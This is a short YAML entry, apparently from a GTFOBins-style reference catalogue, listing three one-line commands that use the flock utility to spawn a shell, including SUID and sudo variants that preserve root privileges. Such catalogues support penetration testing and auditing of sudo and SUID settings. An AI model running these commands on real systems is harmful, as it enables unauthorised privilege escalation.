---
functions:
  shell:
    - code: flock -u / /bin/sh
  suid:
    - code: ./flock -u / /bin/sh -p
  sudo:
    - code: sudo flock -u / /bin/sh
---
